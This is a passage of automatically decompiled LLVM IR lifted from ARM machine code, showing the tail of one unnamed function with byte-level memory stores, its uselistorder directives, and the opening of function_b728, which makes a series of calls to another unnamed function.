  %v1_b520 = trunc i32 %v4_b51c to i8
  %v2_b520 = load i32, i32* @r5, align 4
  %v3_b520 = add i32 %v2_b520, 11
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 %v1_b520, i8* %v4_b520, align 1
  %v3_b524 = load i32, i32* @r5, align 4
  %v4_b524 = add i32 %v3_b524, 10
  %v5_b524 = inttoptr i32 %v4_b524 to i8*
  store i8 %v3_b518, i8* %v5_b524, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b52c = load i32, i32* @r8, align 4
  %v1_b52c = trunc i32 %v0_b52c to i8
  %v2_b52c = load i32, i32* @r6, align 4
  %v3_b52c = add i32 %v2_b52c, 10
  %v4_b52c = inttoptr i32 %v3_b52c to i8*
  store i8 %v1_b52c, i8* %v4_b52c, align 1
  %v0_b530 = load i32, i32* @r8, align 4
  %v1_b530 = trunc i32 %v0_b530 to i8
  %v2_b530 = load i32, i32* @r6, align 4
  %v3_b530 = add i32 %v2_b530, 11
  %v4_b530 = inttoptr i32 %v3_b530 to i8*
  store i8 %v1_b530, i8* %v4_b530, align 1
  %v0_b534 = load i32, i32* @r6, align 4
  store i32 %v0_b534, i32* @r0, align 4
  %v2_b538 = call i32 @function_e424(i32 %v0_b534, i32 20)
  %v3_b538 = trunc i32 %v2_b538 to i8
  store i32 %v2_b538, i32* %r0.global-to-local, align 4
  %v4_b53c = sdiv i32 %v2_b538, 256
  store i32 %v4_b53c, i32* %r3.global-to-local, align 4
  %v3_b540 = load i32, i32* @r6, align 4
  %v4_b540 = add i32 %v3_b540, 10
  %v5_b540 = inttoptr i32 %v4_b540 to i8*
  store i8 %v3_b538, i8* %v5_b540, align 1
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* @r6, align 4
  %v3_b544 = add i32 %v2_b544, 11
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* @r7, align 4
  %v1_b548 = add i32 %v0_b548, 4
  %v2_b548 = inttoptr i32 %v1_b548 to i8*
  %v3_b548 = load i8, i8* %v2_b548, align 1
  %v4_b548 = zext i8 %v3_b548 to i32
  store i32 %v4_b548, i32* %r3.global-to-local, align 4
  %v1_b54c = add i32 %v0_b548, 5
  %v2_b54c = inttoptr i32 %v1_b54c to i8*
  %v3_b54c = load i8, i8* %v2_b54c, align 1
  %v4_b54c = zext i8 %v3_b54c to i32
  store i32 %v0_b548, i32* @r1, align 4
  %v4_b554 = mul nuw nsw i32 %v4_b54c, 256
  %v5_b554 = or i32 %v4_b554, %v4_b548
  store i32 %v5_b554, i32* %r2.global-to-local, align 4
  %v0_b558 = load i32, i32* @r8, align 4
  %v1_b558 = trunc i32 %v0_b558 to i8
  %v3_b558 = add i32 %v0_b548, 6
  %v4_b558 = inttoptr i32 %v3_b558 to i8*
  store i8 %v1_b558, i8* %v4_b558, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_b560 = load i32, i32* @r8, align 4
  %v1_b560 = trunc i32 %v0_b560 to i8
  %v2_b560 = load i32, i32* @r7, align 4
  %v3_b560 = add i32 %v2_b560, 7
  %v4_b560 = inttoptr i32 %v3_b560 to i8*
  store i8 %v1_b560, i8* %v4_b560, align 1
  %v0_b564 = load i32, i32* @r6, align 4
  store i32 %v0_b564, i32* %r0.global-to-local, align 4
  %v4_b568 = call i32 @function_e480(i32 %v0_b564, i32 %v0_b548, i32 %v5_b554, i32 %stack_var_-152.0.ph)
  %v5_b568 = trunc i32 %v4_b568 to i8
  store i32 %v4_b568, i32* %r0.global-to-local, align 4
  %v3_b56c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b56c, i32* %r3.global-to-local, align 4
  %v3_b570 = mul i32 %v3_b56c, 32
  store i32 %v3_b570, i32* %r2.global-to-local, align 4
  %v0_b574 = load i32, i32* @r5, align 4
  %v1_b574 = add i32 %v0_b574, 16
  %v2_b574 = inttoptr i32 %v1_b574 to i32*
  %v3_b574 = load i32, i32* %v2_b574, align 4
  store i32 %v3_b574, i32* %r1.global-to-local, align 4
  %v5_b578 = mul i32 %v3_b56c, 24
  store i32 %v5_b578, i32* %r2.global-to-local, align 4
  %v4_b57c42 = udiv i32 %v4_b568, 256
  %v1_b580 = trunc i32 %v4_b57c42 to i8
  %v2_b580 = load i32, i32* @r7, align 4
  %v3_b580 = add i32 %v2_b580, 7
  %v4_b580 = inttoptr i32 %v3_b580 to i8*
  store i8 %v1_b580, i8* %v4_b580, align 1
  %v0_b584 = load i32, i32* %r2.global-to-local, align 4
  %v1_b584 = load i32, i32* @sb, align 4
  %v2_b584 = add i32 %v1_b584, %v0_b584
  store i32 %v2_b584, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b58c = load i32, i32* @r7, align 4
  %v4_b58c = add i32 %v3_b58c, 6
  %v5_b58c = inttoptr i32 %v4_b58c to i8*
  store i8 %v5_b568, i8* %v5_b58c, align 1
  %v0_b590 = load i32, i32* %r1.global-to-local, align 4
  %v1_b590 = load i32, i32* %lr.global-to-local, align 4
  %v2_b590 = add i32 %v1_b590, 4
  %v3_b590 = inttoptr i32 %v2_b590 to i32*
  store i32 %v0_b590, i32* %v3_b590, align 4
  %v0_b594 = load i32, i32* %r3.global-to-local, align 4
  %v1_b594 = trunc i32 %v0_b594 to i8
  %v2_b594 = load i32, i32* %r2.global-to-local, align 4
  %v3_b594 = load i32, i32* @sb, align 4
  %v4_b594 = add i32 %v3_b594, %v2_b594
  %v5_b594 = inttoptr i32 %v4_b594 to i8*
  store i8 %v1_b594, i8* %v5_b594, align 1
  %v0_b598 = load i32, i32* @r8, align 4
  %v1_b598 = trunc i32 %v0_b598 to i8
  %v2_b598 = load i32, i32* %lr.global-to-local, align 4
  %v3_b598 = add i32 %v2_b598, 2
  %v4_b598 = inttoptr i32 %v3_b598 to i8*
  store i8 %v1_b598, i8* %v4_b598, align 1
  %v0_b59c = load i32, i32* @r8, align 4
  %v1_b59c = trunc i32 %v0_b59c to i8
  %v2_b59c = load i32, i32* %lr.global-to-local, align 4
  %v3_b59c = add i32 %v2_b59c, 1
  %v4_b59c = inttoptr i32 %v3_b59c to i8*
  store i8 %v1_b59c, i8* %v4_b59c, align 1
  %v0_b5a0 = load i32, i32* @r8, align 4
  %v1_b5a0 = trunc i32 %v0_b5a0 to i8
  %v2_b5a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_b5a0 = add i32 %v2_b5a0, 3
  %v4_b5a0 = inttoptr i32 %v3_b5a0 to i8*
  store i8 %v1_b5a0, i8* %v4_b5a0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r1.global-to-local, align 4
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_b5b8 = load i32, i32* %lr.global-to-local, align 4
  %v6_b5c0 = inttoptr i32 %v0_b5ac to i32*
  %v7_b5c0 = call i32 @function_13f2c(i32 %v3_b160, i32* %v6_b5c0, i32 %stack_var_-120.0.ph, i32 16384, i32 %v0_b5b8, i32 16)
  %v3_b5c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b5c4, i32* %r3.global-to-local, align 4
  %v1_b5c8 = add i32 %v3_b5c4, 1
  store i32 %v1_b5c8, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @fp, align 4
  %v9_b5cc = icmp eq i32 %v1_b5c8, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b5c8, i32* %stack_var_-40, align 4
  %v6_b5d4 = icmp slt i32 %v1_b5c8, %v1_b5cc
  br i1 %v6_b5d4, label %dec_label_pc_b48c, label %dec_label_pc_b474

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b170
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v1_b5e0 = call i32 @function_1369c(i32 %v3_b160)
  store i32 %v1_b5e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b5dc
  %v29_b5e8 = phi i32 [ %v3_b160, %dec_label_pc_b00c ], [ %v1_b5e0, %dec_label_pc_b5dc ]
  store i32 %v3_b00c, i32* %r4.global-to-local, align 4
  store i32 %v15_b00c, i32* %r8.global-to-local, align 4
  ret i32 %v29_b5e8

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b48c
  %v1_b5ec = add i32 %v2_b494, 16
  %v2_b5ec = inttoptr i32 %v1_b5ec to i32*
  %v3_b5ec = load i32, i32* %v2_b5ec, align 4
  store i32 %v3_b5ec, i32* %r4.global-to-local, align 4
  %v0_b5f0 = call i32 @function_fe60()
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v3_b5f4 = load i32, i32* %stack_var_-40, align 4
  %v5_b5fc = mul i32 %v3_b5f4, 24
  %v0_b600 = load i32, i32* %r4.global-to-local, align 4
  %v1_b604 = load i32, i32* @sb, align 4
  %v2_b604 = add i32 %v1_b604, %v5_b5fc
  store i32 %v2_b604, i32* %r1.global-to-local, align 4
  %v1_b608 = and i32 %v0_b600, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_b608, i32* %r3.global-to-local, align 4
  %v1_b600 = udiv i32 %v0_b600, 256
  %v3_b60c = and i32 %v1_b600, 65280
  store i32 %v3_b60c, i32* %r2.global-to-local, align 4
  %v3_b610 = mul i32 %v0_b600, 16777216
  %v1_b614 = add i32 %v2_b604, 20
  %v2_b614 = inttoptr i32 %v1_b614 to i8*
  %v3_b614 = load i8, i8* %v2_b614, align 1
  %v4_b614 = zext i8 %v3_b614 to i32
  store i32 %v4_b614, i32* %lr.global-to-local, align 4
  %v4_b618 = mul i32 %v1_b608, 256
  %v5_b618 = or i32 %v4_b618, %v3_b610
  %v4_b61c = udiv i32 %v0_b600, 16777216
  %v5_b61c = or i32 %v3_b60c, %v4_b61c
  %v2_b620 = or i32 %v5_b61c, %v5_b618
  %v7_b624 = lshr i32 %v0_b5f0, %v4_b614
  %v8_b624 = add i32 %v7_b624, %v2_b620
  %v3_b630 = mul i32 %v8_b624, 16777216
  %v1_b634 = and i32 %v8_b624, 65280
  store i32 %v1_b634, i32* %r0.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v4_b640 = mul nuw nsw i32 %v1_b634, 256
  %v5_b640 = or i32 %v4_b640, %v3_b630
  store i32 %v5_b640, i32* %r1.global-to-local, align 4
  %v2_b644 = call i32 @llvm.bswap.i32(i32 %v8_b624)
  store i32 %v2_b644, i32* %r3.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  %v1_b64c = load i32, i32* @r5, align 4
  %v2_b64c = add i32 %v1_b64c, 16
  %v3_b64c = inttoptr i32 %v2_b64c to i32*
  store i32 %v2_b644, i32* %v3_b64c, align 4
  br i1 %v2_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b654:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  %v0_b654 = call i32 @function_fe60()
  store i32 %v0_b654, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_b660 = load i32, i32* @sl, align 4
  %v9_b660 = icmp eq i32 %v0_b660, 65535
  store i1 %v9_b660, i1* %cpsr_z.global-to-local, align 1
  %v1_b664 = load i32, i32* @r5, align 4
  %v2_b664 = add i32 %v1_b664, 12
  %v3_b664 = inttoptr i32 %v2_b664 to i32*
  store i32 %v0_b654, i32* %v3_b664, align 4
  br i1 %v9_b660, label %dec_label_pc_b66c, label %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge

dec_label_pc_b654.dec_label_pc_b4d0_crit_edge:    ; preds = %dec_label_pc_b654
  %v1_b4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4d0

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b4c0
  %v0_b66c = call i32 @function_fe60()
  %v3_b674 = urem i32 %v0_b66c, 65536
  store i32 %v3_b674, i32* %r0.global-to-local, align 4
  %v3_b67815 = udiv i32 %v0_b66c, 256
  %v1_b67c = trunc i32 %v3_b67815 to i8
  %v2_b67c = load i32, i32* @r5, align 4
  %v3_b67c = add i32 %v2_b67c, 5
  %v4_b67c = inttoptr i32 %v3_b67c to i8*
  store i8 %v1_b67c, i8* %v4_b67c, align 1
  %v0_b680 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v1_b688 = sub i32 999, %v0_b680
  store i32 %v1_b688, i32* %r2.global-to-local, align 4
  %v3_b68c = sdiv i32 %v1_b688, 256
  store i32 %v3_b68c, i32* %r1.global-to-local, align 4
  %v1_b690 = load i32, i32* @r4, align 4
  %v9_b690 = icmp eq i32 %v3_b1b4, %v1_b690
  store i1 %v9_b690, i1* %cpsr_z.global-to-local, align 1
  %v1_b694 = trunc i32 %v0_b680 to i8
  %v2_b694 = load i32, i32* @r5, align 4
  %v3_b694 = add i32 %v2_b694, 4
  %v4_b694 = inttoptr i32 %v3_b694 to i8*
  store i8 %v1_b694, i8* %v4_b694, align 1
  %v0_b698 = load i32, i32* %r1.global-to-local, align 4
  %v1_b698 = trunc i32 %v0_b698 to i8
  %v2_b698 = load i32, i32* @r6, align 4
  %v3_b698 = add i32 %v2_b698, 5
  %v4_b698 = inttoptr i32 %v3_b698 to i8*
  store i8 %v1_b698, i8* %v4_b698, align 1
  %v0_b69c = load i32, i32* %r2.global-to-local, align 4
  %v1_b69c = trunc i32 %v0_b69c to i8
  %v2_b69c = load i32, i32* @r6, align 4
  %v3_b69c = add i32 %v2_b69c, 4
  %v4_b69c = inttoptr i32 %v3_b69c to i8*
  store i8 %v1_b69c, i8* %v4_b69c, align 1
  %v0_b6a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6a0, label %dec_label_pc_b6a4, label %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge

dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge:    ; preds = %dec_label_pc_b66c
  %v1_b4e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4dc

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b66c, %dec_label_pc_b4d0
  %v0_b6a4 = call i32 @function_fe60()
  %v1_b6a4 = trunc i32 %v0_b6a4 to i8
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v4_b6ac = sdiv i32 %v0_b6a4, 256
  store i32 %v4_b6ac, i32* %r3.global-to-local, align 4
  %v1_b6b0 = load i32, i32* @r4, align 4
  %v9_b6b0 = icmp eq i32 %v3_b1b8, %v1_b6b0
  store i1 %v9_b6b0, i1* %cpsr_z.global-to-local, align 1
  %v3_b6b4 = load i32, i32* @r5, align 4
  %v4_b6b4 = add i32 %v3_b6b4, 44
  %v5_b6b4 = inttoptr i32 %v4_b6b4 to i8*
  store i8 %v1_b6a4, i8* %v5_b6b4, align 1
  %v0_b6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6b8 = trunc i32 %v0_b6b8 to i8
  %v2_b6b8 = load i32, i32* @r7, align 4
  %v3_b6b8 = add i32 %v2_b6b8, 1
  %v4_b6b8 = inttoptr i32 %v3_b6b8 to i8*
  store i8 %v1_b6b8, i8* %v4_b6b8, align 1
  %v0_b6bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6bc, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  %v0_b6c0 = call i32 @function_fe60()
  %v1_b6c0 = trunc i32 %v0_b6c0 to i8
  store i32 %v0_b6c0, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  %v4_b6c8 = sdiv i32 %v0_b6c0, 256
  store i32 %v4_b6c8, i32* %r3.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6d0 = trunc i32 %v4_b6c8 to i8
  %v2_b6d0 = load i32, i32* @r7, align 4
  %v3_b6d0 = add i32 %v2_b6d0, 3
  %v4_b6d0 = inttoptr i32 %v3_b6d0 to i8*
  store i8 %v1_b6d0, i8* %v4_b6d0, align 1
  %v0_b6d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6d4, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_b6c0
  %v1_b6d4 = load i32, i32* @r5, align 4
  %v2_b6d4 = add i32 %v1_b6d4, 16
  %v3_b6d4 = inttoptr i32 %v2_b6d4 to i32*
  %v4_b6d4 = load i32, i32* %v3_b6d4, align 4
  store i32 %v4_b6d4, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_b6c0, %bb100
  %v3_b6d8 = load i32, i32* @r7, align 4
  %v4_b6d8 = add i32 %v3_b6d8, 2
  %v5_b6d8 = inttoptr i32 %v4_b6d8 to i8*
  store i8 %v1_b6c0, i8* %v5_b6d8, align 1
  %v0_b6dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6dc, label %dec_label_pc_b6e4, label %bb102

bb102:                                            ; preds = %bb101
  %v1_b6dc = load i32, i32* %r3.global-to-local, align 4
  %v2_b6dc = load i32, i32* @r6, align 4
  %v3_b6dc = add i32 %v2_b6dc, 16
  %v4_b6dc = inttoptr i32 %v3_b6dc to i32*
  store i32 %v1_b6dc, i32* %v4_b6dc, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b4e8, %bb101
  %v0_b6e4 = call i32 @function_fe60()
  store i32 %v0_b6e4, i32* %r0.global-to-local, align 4
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6f0 = load i32, i32* @r6, align 4
  %v2_b6f0 = add i32 %v1_b6f0, 16
  %v3_b6f0 = inttoptr i32 %v2_b6f0 to i32*
  store i32 %v0_b6e4, i32* %v3_b6f0, align 4
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4
  %v0_b6f8 = load i32, i32* @r7, align 4
  %v1_b6f8 = add i32 %v0_b6f8, 8
  store i32 %v1_b6f8, i32* %r0.global-to-local, align 4
  store i32 %v5_b0f8, i32* @r1, align 4
  %v1_b700 = inttoptr i32 %v1_b6f8 to i8*
  %v2_b700 = call i32 @function_1003c(i8* %v1_b700)
  store i32 %v2_b700, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b508

dec_label_pc_b708:                                ; preds = %dec_label_pc_b198
  %v1_b710 = add i32 %v5_b0f8, 8
  store i32 %v1_b710, i32* %r2.global-to-local, align 4
  %v1_b714 = add i32 %v5_b0f8, 52
  store i32 %v1_b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b474.preheader

; uselistorder directives
  uselistorder i32 %v1_b714, { 1, 0 }
  uselistorder i32 %v1_b710, { 1, 0 }
  uselistorder i32 %v4_b6c8, { 1, 0 }
  uselistorder i32 %v0_b6c0, { 0, 2, 1 }
  uselistorder i32 %v0_b6a4, { 0, 2, 1 }
  uselistorder i32 %v2_b644, { 1, 0 }
  uselistorder i32 %v8_b624, { 1, 2, 0 }
  uselistorder i32 %v0_b600, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b5cc, { 1, 2, 0 }
  uselistorder i32 %v1_b5c8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_b56c, { 1, 0, 2 }
  uselistorder i32 %v4_b568, { 0, 2, 1 }
  uselistorder i32 %v0_b548, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_b538, { 0, 2, 1 }
  uselistorder i32 %v4_b51c, { 1, 0 }
  uselistorder i32 %v7_b4a0, { 1, 0, 2 }
  uselistorder i32 %v0_b474, { 1, 0 }
  uselistorder i1 %v7_b4b8, { 2, 1, 0 }
  uselistorder i1 %v2_b6ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b434, { 1, 0, 2 }
  uselistorder i32 %v0_b3f8, { 1, 0, 2 }
  uselistorder i32 %v3_b2ac, { 0, 2, 1 }
  uselistorder i32 %v3_b26c, { 1, 0 }
  uselistorder i32 %tmp86, { 1, 0 }
  uselistorder i32 %v1_b224, { 1, 0 }
  uselistorder i32 %v1_b200, { 1, 0 }
  uselistorder i32 %v1_b1fc, { 0, 2, 1 }
  uselistorder i32 %v3_b1e0, { 2, 1, 0 }
  uselistorder i32 %v0_b1bc, { 1, 0, 2 }
  uselistorder i32 %v1_b1ac, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_b1a8, { 0, 2, 1 }
  uselistorder i32 %v0_b1a4, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b190, { 1, 0 }
  uselistorder i1 %v7_b164, { 1, 0 }
  uselistorder i32 %v3_b160, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_b14c, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b118, { 1, 0, 2 }
  uselistorder i32 %v5_b0f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_b09c, { 1, 0 }
  uselistorder i32 %v2_b02c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b010, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_b6e4, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b508, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b474.preheader, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %.thread23, { 2, 1, 0 }
}

define i32 @function_b728(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b728:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_b72c = urem i32 %arg1, 256
  store i32 %v1_b72c, i32* @fp, align 4
  store i32 %v1_b72c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b744 = urem i32 %arg3, 256
  store i32 %v1_b744, i32* @r4, align 4
  %v2_b748 = call i32 @function_14294(i32 %v1_b72c, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b754 = load i32, i32* @fp, align 4
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v2_b758 = call i32 @function_14294(i32 %v0_b754, i32 4)
  %v0_b75c = load i32, i32* @r5, align 4
  store i32 %v0_b75c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b76c = load i32, i32* @r4, align 4
  store i32 %v0_b76c, i32* %r0.global-to-local, align 4
  %v5_b770 = inttoptr i32 %v0_b75c to i32*
  %v6_b770 = call i32 @function_a4e8(i32 %v0_b76c, i32* %v5_b770, i32 2, i32 0)
  %v1_b77c = urem i32 %v6_b770, 256
  store i32 %v1_b77c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b788 = load i32, i32* @r5, align 4
  store i32 %v0_b788, i32* %r1.global-to-local, align 4
  %v0_b78c = load i32, i32* @r4, align 4
  store i32 %v0_b78c, i32* %r0.global-to-local, align 4
  %v6_b794 = inttoptr i32 %v0_b788 to i32*
  %v7_b794 = call i32 @function_a4e8(i32 %v0_b78c, i32* %v6_b794, i32 3, i32 65535)
  %v0_b798 = load i32, i32* @r5, align 4
  store i32 %v0_b798, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b794, i32* @r6, align 4
  %v0_b7a8 = load i32, i32* @r4, align 4
  store i32 %v0_b7a8, i32* %r0.global-to-local, align 4
  %v4_b7ac = inttoptr i32 %v0_b798 to i32*
  %v5_b7ac = call i32 @function_a4e8(i32 %v0_b7a8, i32* %v4_b7ac, i32 4, i32 64)
  %v1_b7b4 = urem i32 %v5_b7ac, 256
  store i32 %v1_b7b4, i32* %ip.global-to-local, align 4
  %v0_b7b8 = load i32, i32* @r5, align 4
  store i32 %v0_b7b8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @r4, align 4
  store i32 %v0_b7c4, i32* %r0.global-to-local, align 4
  %v6_b7cc = inttoptr i32 %v0_b7b8 to i32*
  %v7_b7cc = call i32 @function_a4e8(i32 %v0_b7c4, i32* %v6_b7cc, i32 5, i32 1)
  %v1_b7d8 = urem i32 %v7_b7cc, 256
  store i32 %v1_b7d8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b7e0 = load i32, i32* @r5, align 4
  store i32 %v0_b7e0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b7e8 = load i32, i32* @r4, align 4
  store i32 %v0_b7e8, i32* %r0.global-to-local, align 4
  %v5_b7f0 = inttoptr i32 %v0_b7e0 to i32*
  %v6_b7f0 = call i32 @function_a4e8(i32 %v0_b7e8, i32* %v5_b7f0, i32 7, i32 65535)
  %v0_b7f4 = load i32, i32* @r5, align 4
  store i32 %v0_b7f4, i32* %r1.global-to-local, align 4
  %v3_b7f8 = mul i32 %v6_b7f0, 65536
  store i32 %v3_b7f8, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b804 = load i32, i32* @r4, align 4
  store i32 %v0_b804, i32* %r0.global-to-local, align 4
  %v4_b808 = inttoptr i32 %v0_b7f4 to i32*
  %v5_b808 = call i32 @function_a4e8(i32 %v0_b804, i32* %v4_b808, i32 11, i32 0)
  %v1_b810 = urem i32 %v5_b808, 256
  store i32 %v1_b810, i32* %ip.global-to-local, align 4
  %v0_b814 = load i32, i32* @r5, align 4
  store i32 %v0_b814, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
